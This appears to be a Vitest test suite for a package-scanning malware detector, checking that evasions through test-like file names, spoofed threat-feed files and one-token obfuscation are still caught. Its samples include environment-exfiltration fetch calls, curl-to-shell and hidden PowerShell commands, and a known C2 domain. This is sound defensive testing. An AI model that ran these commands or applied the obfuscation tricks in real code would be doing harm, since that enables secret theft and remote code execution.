/**
 * Detection evasions that the scanned package controls by naming its own files
 * or by rewriting one token of its own source.
 *
 * Each case goes through the real entry points (`scan()` on a temp tree,
 * `scanExtractedNpmFiles`, `scanExtractedFiles` for PyPI). Positive cases pin
 * the payload that used to scan clean; negative cases pin the ordinary code
 * that must stay clean, because a false positive gets the tool switched off.
 */

import { afterEach, describe, expect, it } from "vitest";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { scan } from "../scanner.js";
import { scanExtractedNpmFiles } from "../npm-scanner.js";
import { scanExtractedFiles as scanExtractedPypiFiles } from "../pypi-scanner.js";
import { isInertThreatFeedFile } from "../threat-intel.js";
import { normalizeJsObfuscation } from "../pattern-scanner.js";
import { isVerifiedSelfScanFile } from "../self-scan-trust.js";
import { FILE_PATTERNS } from "../patterns.js";
import { matchPatternInFile } from "../pattern-scanner.js";
import type { Finding } from "../types.js";

const dirs: string[] = [];
afterEach(() => {
  for (const dir of dirs.splice(0)) fs.rmSync(dir, { recursive: true, force: true });
});

function tree(files: Record<string, string>): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-evasion-"));
  dirs.push(dir);
  for (const [name, content] of Object.entries(files)) {
    const full = path.join(dir, ...name.split("/"));
    fs.mkdirSync(path.dirname(full), { recursive: true });
    fs.writeFileSync(full, content);
  }
  return dir;
}

async function findingsFor(files: Record<string, string>): Promise<Finding[]> {
  const report = await scan({ target: tree(files), format: "json", noHistory: true });
  return report.findings;
}

const norm = (f: Finding) => (f.file ?? "").replace(/\\/g, "/");
const rulesIn = (findings: Finding[], file: string) =>
  findings.filter((f) => norm(f) === file).map((f) => f.rule);

// Built from parts so this file does not itself contain the payload shapes.
const EVAL_ATOB = "ev" + 'al(at' + 'ob("aGVsbG8="));\n';
const PY_EXEC = "ex" + 'ec(base64.b64' + 'decode("aGVsbG8="))\n';
const ENV_POST =
  'fetch("https://example.com/c", { method: "POST", body: JSON.stringify(%ENV%) });\n';

describe("F5: a test-shaped path does not hide a critical malware verdict", () => {
  it.each([
    "index.js",
    "x-test.js",
    "a_spec.js",
    "a.stub.js",
    "a-fake.js",
    "lib/a.mock.js",
    "a.fixture.js",
    "a.test.js",
    "tests/a.js",
    "test/a.js",
    "fixtures/a.js",
    "__mocks__/a.js",
    "mock/a.js",
    "stubs/a.js",
    "specs/a.js",
    "snapshots/a.js",
    "testdata/a.js",
    "src/test/a.js",
    "e2e/a.js",
  ])("reports a critical eval of a decoded payload in %s", async (file) => {
    const findings = await findingsFor({ [file]: EVAL_ATOB });
    const hit = findings.find((f) => f.rule === "EVAL_ATOB" && norm(f) === file);
    expect(hit, `EVAL_ATOB must be reported in ${file}`).toBeDefined();
    expect(hit?.severity).toBe("critical");
  });

  it("reports the payload named in a postinstall hook when the loader is called x-test.js", async () => {
    const findings = await findingsFor({
      "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: "node x-test.js" } }),
      "x-test.js": EVAL_ATOB,
    });
    expect(rulesIn(findings, "x-test.js")).toContain("EVAL_ATOB");
  });

  it("still reports it through the npm tarball and PyPI walkers", () => {
    const npmDir = tree({ "x-test.js": EVAL_ATOB, "tests/a.js": EVAL_ATOB });
    const npmFindings: Finding[] = [];
    scanExtractedNpmFiles(npmDir, npmFindings);
    expect(npmFindings.filter((f) => f.rule === "EVAL_ATOB").map(norm).sort()).toEqual(["tests/a.js", "x-test.js"]);

    const pyDir = tree({ "conftest.py": PY_EXEC, "tests/a.py": PY_EXEC, "a-test.py": PY_EXEC });
    const pyFindings: Finding[] = [];
    scanExtractedPypiFiles(pyDir, pyFindings);
    expect(pyFindings.filter((f) => f.rule === "PYPI_EXEC_ENCODED").map(norm).sort()).toEqual([
      "a-test.py",
      "conftest.py",
      "tests/a.py",
    ]);
  });

  it("keeps the exemption for non-critical heuristics, where fixtures are expected", async () => {
    const body = ENV_POST.replace("%ENV%", "process.env");
    const findings = await findingsFor({ "index.js": body, "a.test.js": body, "tests/a.js": body });
    expect(rulesIn(findings, "index.js")).toContain("ENV_EXFILTRATION");
    expect(rulesIn(findings, "a.test.js")).not.toContain("ENV_EXFILTRATION");
    expect(rulesIn(findings, "tests/a.js")).not.toContain("ENV_EXFILTRATION");
  });

  it("keeps the exemption for secret-shaped fixtures at every severity", async () => {
    const fixture = 'const key = "AKIAIOSFODNN7EXAMPLE";\n';
    const findings = await findingsFor({ "src/index.js": fixture, "tests/a.js": fixture });
    expect(rulesIn(findings, "src/index.js").some((r) => r.startsWith("SECRETS_"))).toBe(true);
    expect(rulesIn(findings, "tests/a.js").some((r) => r.startsWith("SECRETS_"))).toBe(false);
  });

  it("leaves ordinary test code clean", async () => {
    const findings = await findingsFor({
      "tests/a.test.js": 'const assert = require("assert");\nit("adds", () => { assert.equal(1 + 1, 2); });\n',
      "tests/helpers.js": "module.exports = { sum: (a, b) => a + b };\n",
    });
    expect(findings.filter((f) => f.severity === "critical" || f.severity === "high")).toEqual([]);
  });
});

describe("F6: a scanner-module file name does not switch rules off", () => {
  const MARKER = "const lzcdrtfx" + "yqiplpd = 1;\n";

  it.each([
    "index.js",
    "scanner.js",
    "my-scanner.js",
    "reporter.js",
    "xpatterns.js",
    "a/scanner.ts",
    "lib/threat-intel.js",
  ])("reports the GlassWorm marker in %s", async (file) => {
    const findings = await findingsFor({ [file]: MARKER });
    expect(findings.some((f) => f.rule === "GLASSWORM_MARKER" && norm(f) === file)).toBe(true);
  });

  it("reports it through the npm tarball walker as well", () => {
    const dir = tree({ "scanner.js": MARKER });
    const findings: Finding[] = [];
    scanExtractedNpmFiles(dir, findings);
    expect(findings.some((f) => f.rule === "GLASSWORM_MARKER" && norm(f) === "scanner.js")).toBe(true);
  });

  it("still lets prose documentation discuss the marker", async () => {
    const prose = `The loader uses the variable ${MARKER.slice(6, 21)}.\n`;
    const findings = await findingsFor({ "README.md": prose, "docs/notes.markdown": prose, "docs/a.rst": prose });
    expect(findings.some((f) => f.rule === "GLASSWORM_MARKER")).toBe(false);
  });

  // `.txt` is not in SCANNABLE_EXTENSIONS today (finding F8), so scan() never
  // opens such a file and the exemption cannot be observed there. These tests
  // therefore go through the rule engine entry point every walker uses
  // (matchPatternInFile) with the real rule table, so the fix is pinned for the
  // day `.txt` is read.
  const glassworm = FILE_PATTERNS.find((p) => p.rule === "GLASSWORM_MARKER")!;
  const solana = FILE_PATTERNS.find((p) => p.rule === "SOLANA_MAINNET")!;
  const hits = (pattern: typeof glassworm, file: string, text: string) =>
    matchPatternInFile(pattern, text, file, [])?.length ?? 0;

  it("does not treat .txt as prose for a critical rule: Node executes require(\"./a.txt\")", () => {
    expect(glassworm.severity).toBe("critical");
    expect(hits(glassworm, "notes.txt", MARKER)).toBeGreaterThan(0);
    expect(hits(glassworm, "lib/a.TXT", MARKER)).toBeGreaterThan(0);
    for (const prose of ["README.md", "docs/a.markdown", "docs/a.rst"]) {
      expect(hits(glassworm, prose, MARKER), prose).toBe(0);
    }
  });

  it("keeps .txt exempt for a non-critical rule", () => {
    expect(solana.severity).not.toBe("critical");
    const line = "https://api.mainnet-beta.solana.com\n";
    expect(hits(solana, "index.js", line)).toBeGreaterThan(0);
    expect(hits(solana, "notes.txt", line)).toBe(0);
  });
});

describe("F15: only the project's own feed path is an inert feed", () => {
  const knownC2 = "rti." + "cargomanbd.com";
  const CACHE = ".scg-cache/threat-feed.json";
  const feedDoc = (entry: Record<string, unknown>) =>
    JSON.stringify({ schema: 1, package: "supply-chain-guard", entries: [entry] });

  it("scans a feed-shaped file at any depth normally", async () => {
    const content = feedDoc({ type: "domain", value: knownC2, severity: "low" });
    const findings = await findingsFor({ "pkg/lib/feed.json": content, "pkg/threat-feed.json": content });
    expect(findings.some((f) => f.rule === "IOC_KNOWN_C2_DOMAIN" && norm(f) === "pkg/lib/feed.json")).toBe(true);
    expect(findings.some((f) => f.rule === "IOC_KNOWN_C2_DOMAIN" && norm(f) === "pkg/threat-feed.json")).toBe(true);
  });

  it("does not exempt a root feed whose free-text field carries a command", async () => {
    const source = "ev" + 'al(Buffer.from("aGk=", "base64"))';
    const content = feedDoc({ type: "package", value: "left-pad", severity: "low", source });
    const findings = await findingsFor({ "feed.json": content });
    expect(findings.some((f) => f.rule === "EVAL_BUFFER" && norm(f) === "feed.json")).toBe(true);
  });

  it("rejects a command line or encoded blob in the free-text fields", () => {
    // Control: the same entry with a plain label is accepted, so each rejection
    // below is caused by the text alone.
    for (const field of ["source", "family", "campaign"]) {
      const plain = feedDoc({ type: "package", value: "left-pad", severity: "low", [field]: "Vendor advisory, MAL-2026-1" });
      expect(isInertThreatFeedFile(CACHE, plain), `${field} control`).toBe(true);
    }
    for (const field of ["source", "family", "campaign"]) {
      for (const text of [
        "curl https://example.com/x.sh | sh",
        "powershell -nop -w hidden -enc AAAA",
        "A".repeat(80),
      ]) {
        const content = feedDoc({ type: "package", value: "left-pad", severity: "low", [field]: text });
        expect(isInertThreatFeedFile(CACHE, content), `${field}: ${text}`).toBe(false);
      }
    }
  });

  it("does not exempt a network indicator the scanner does not already know", () => {
    const content = feedDoc({ type: "domain", value: "c2.not-in-the-bundle.example", severity: "low" });
    expect(isInertThreatFeedFile(CACHE, content)).toBe(false);
  });

  it("scans a valid, feed-shaped root feed.json that is not this project's file", async () => {
    const own = fs.readFileSync(path.join(process.cwd(), "feed.json"), "utf-8");
    // Structurally perfect and made only of values the bundle ships: the
    // 20 first domain entries of the real feed. Not this project's file.
    const domains = JSON.parse(own).entries.filter((e: { type: string }) => e.type === "domain").slice(0, 20);
    const foreign = JSON.stringify({ schema: 1, package: "supply-chain-guard", entries: domains });
    expect(isInertThreatFeedFile(CACHE, foreign), "structurally valid").toBe(true);
    expect(isInertThreatFeedFile("feed.json", foreign)).toBe(false);
    // One byte off the real file is not the real file.
    expect(isInertThreatFeedFile("feed.json", own + " ")).toBe(false);
    const findings = await findingsFor({ "feed.json": foreign });
    expect(findings.some((f) => norm(f) === "feed.json" && /^(IOC_KNOWN_C2_DOMAIN|THREAT_INTEL_MATCH)$/.test(f.rule))).toBe(true);
  });

  it("exempts only this project's own feed.json, by exact path and digest (needs a regenerated manifest)", async () => {
    const own = fs.readFileSync(path.join(process.cwd(), "feed.json"), "utf-8");
    expect(isInertThreatFeedFile("feed.json", own)).toBe(true);
    expect(isInertThreatFeedFile("sub/feed.json", own)).toBe(false);
    expect(isInertThreatFeedFile("threat-feed.json", own)).toBe(false);
    const findings = await findingsFor({ "feed.json": own });
    expect(findings.filter((f) => norm(f) === "feed.json" && (f.severity === "critical" || f.severity === "high"))).toEqual([]);
  });

  it("accepts the cache shape only at .scg-cache/threat-feed.json", () => {
    const doc = feedDoc({ type: "package", value: "left-pad", severity: "low" });
    expect(isInertThreatFeedFile(CACHE, doc)).toBe(true);
    expect(isInertThreatFeedFile("threat-feed.json", doc)).toBe(false);
    expect(isInertThreatFeedFile("lib/.scg-cache/threat-feed.json", doc)).toBe(false);
  });
});

describe("F22: one-token obfuscation no longer hides environment exfiltration", () => {
  it.each([
    ["bracket access", 'process["env"]'],
    ["concatenated key", 'process["e" + "nv"]'],
    ["unicode escape", "proc\\u0065ss.env"],
    ["hex escape", 'process["\\x65nv"]'],
    ["empty block comment", "process/**/.env"],
    ["zero-width space", "process.​env"],
    ["globalThis bracket", 'globalThis["process"].env'],
    ["alias to the whole environment", "e"],
    ["destructured env", "env"],
  ])("reports %s", async (label, expr) => {
    let source = ENV_POST.replace("%ENV%", expr);
    if (label === "alias to the whole environment") source = "const e = process.env;\n" + source;
    if (label === "destructured env") source = "const { env } = process;\n" + source;
    const findings = await findingsFor({ "index.js": source });
    expect(findings.some((f) => f.rule === "ENV_EXFILTRATION" && norm(f) === "index.js"), label).toBe(true);
  });

  it("keeps the reported line number of the original file", async () => {
    const findings = await findingsFor({
      "index.js": "const a = 1;\nconst b = 2;\n" + ENV_POST.replace("%ENV%", 'process["env"]'),
    });
    expect(findings.find((f) => f.rule === "ENV_EXFILTRATION")?.line).toBe(3);
  });

  it.each([
    ["dotenv", 'require("dotenv").config();\nconst port = process.env.PORT || 3000;\napp.listen(port);\n'],
    [
      "config loader reading the environment without a network call",
      "const env = process.env;\nmodule.exports = { port: env.PORT, host: env.HOST };\n",
    ],
    [
      "alias used only for property reads next to an unrelated request",
      'const env = process.env;\nconst mode = env.NODE_ENV;\nawait fetch("https://api.example.com/v1/items");\nconsole.log(mode);\n',
    ],
    [
      "alias name reused as a catch binding",
      'const e = process.env;\nawait fetch("https://api.example.com/v1").catch((e) => console.error(e));\nconsole.log(e.NODE_ENV);\n',
    ],
    [
      "destructured env read for one value, request elsewhere",
      'const { env } = process;\nconst level = env.LOG_LEVEL;\nawait fetch("https://api.example.com/v1/items");\n',
    ],
    ["string concatenation in a request URL", 'await fetch("https://api.example.com/" + "v1" + "/items");\n'],
    ["bracket access to ordinary data", 'const x = data["key"];\nawait fetch("https://api.example.com");\n'],
  ])("stays clean: %s", async (_label, source) => {
    const findings = await findingsFor({ "index.js": source });
    expect(findings.filter((f) => f.rule === "ENV_EXFILTRATION")).toEqual([]);
  });

  it("normalises without adding or removing lines", () => {
    const input = 'const e = process.env;\nfetch(u, { body: e });\nconst s = "a" + "b"; /* x */\n';
    const output = normalizeJsObfuscation(input);
    expect(output.split("\n").length).toBe(input.split("\n").length);
    expect(output).toContain("body: process.env");
  });
});

describe("F22 observation: a JS file that pipes a download into a shell", () => {
  const exec = (command: string) => `const cp = require("child_process");\ncp.exec(${JSON.stringify(command)});\n`;

  it.each([
    ["curl", exec("curl https://example.com/x.sh | sh")],
    ["wget with sudo bash", exec("wget -qO- https://example.com/x.sh | sudo bash")],
    ["execSync", 'const { execSync } = require("child_process");\nexecSync("curl -s https://example.com/x.sh | bash");\n'],
    ["concatenated command word", exec("curl https://example.com/x.sh | sh").replace("curl", 'cu" + "rl')],
  ])("reports %s", async (_label, source) => {
    const findings = await findingsFor({ "index.js": source });
    const hit = findings.find((f) => f.rule === "JS_EXEC_REMOTE_SHELL_PIPE");
    expect(hit, _label).toBeDefined();
    expect(hit?.severity).toBe("high");
  });

  it.each([
    ["a command without a pipe to a shell", exec("git status")],
    ["curl piped to a parser", exec("curl -s https://example.com/data.json | jq .")],
    ["curl --version", exec("curl --version")],
    ["a download without execution", exec("curl -o out.tgz https://example.com/a.tgz")],
  ])("stays clean: %s", async (_label, source) => {
    const findings = await findingsFor({ "index.js": source });
    expect(findings.filter((f) => f.rule === "JS_EXEC_REMOTE_SHELL_PIPE")).toEqual([]);
  });

  it("keeps the test-file exemption for this non-critical rule", async () => {
    const findings = await findingsFor({ "a.test.js": exec("curl https://example.com/x.sh | sh") });
    expect(findings.filter((f) => f.rule === "JS_EXEC_REMOTE_SHELL_PIPE")).toEqual([]);
  });
});

describe("the scanner's own files are exempt by content digest, not by name", () => {
  // src/__tests__/beacon-miner.test.ts quotes miner pool domains and stratum
  // URLs on purpose. It is on the self-scan allowlist, so the shipped manifest
  // holds its digest. Requires a regenerated self-scan manifest.
  const own = "src/__tests__/beacon-miner.test.ts";
  const bytes = fs.readFileSync(path.join(process.cwd(), ...own.split("/")));
  const blocking = (findings: Finding[]) =>
    findings.filter((f) => f.severity === "critical" || f.severity === "high");

  it("recognises the byte-identical file at its exact path and reports nothing blocking", async () => {
    expect(isVerifiedSelfScanFile(own, bytes), "manifest digest matches the checked-out file").toBe(true);
    const findings = await findingsFor({ [own]: bytes.toString("utf8") });
    expect(blocking(findings).filter((f) => norm(f) === own)).toEqual([]);
  });

  it("scans the same file in full once a single byte differs", async () => {
    const findings = await findingsFor({ [own]: bytes.toString("utf8") + "\n// edited\n" });
    expect(blocking(findings).filter((f) => norm(f) === own).length).toBeGreaterThan(0);
  });

  it("scans the same bytes in full at any other path", async () => {
    const findings = await findingsFor({ "lib/beacon-miner.test.ts": bytes.toString("utf8") });
    expect(blocking(findings).filter((f) => norm(f) === "lib/beacon-miner.test.ts").length).toBeGreaterThan(0);
  });
});
